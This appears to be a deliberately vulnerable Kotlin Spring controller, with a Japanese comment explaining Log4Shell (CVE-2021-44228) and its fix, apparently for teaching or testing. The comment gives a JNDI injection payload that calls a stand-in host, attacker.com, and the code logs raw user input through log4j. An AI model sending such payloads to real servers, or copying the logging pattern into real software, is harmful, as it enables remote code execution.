package com.example.vulnerable.controller

import org.apache.logging.log4j.LogManager
import org.springframework.web.bind.annotation.*

@RestController
@RequestMapping("/api/search")
class SearchController {

    private val logger = LogManager.getLogger(SearchController::class.java)

    // CVE-2021-44228 (Log4Shell, CVSS 10.0):
    // log4j-core 2.14.1 はユーザー入力中の ${jndi:ldap://...} を評価する。
    // 攻撃例: GET /api/search?query=${jndi:ldap://attacker.com/exploit}
    //         → 攻撃者の LDAP サーバーへ接続し任意クラスをロード・実行。
    // 修正: log4j-core 2.15.0 以上にアップグレード、または
    //       -Dlog4j2.formatMsgNoLookups=true を設定。
    @GetMapping
    fun search(@RequestParam query: String): Map<String, Any> {
        logger.info("Search query received: {}", query)
        return mapOf(
            "query" to query,
            "results" to emptyList<String>(),
            "total" to 0
        )
    }
}
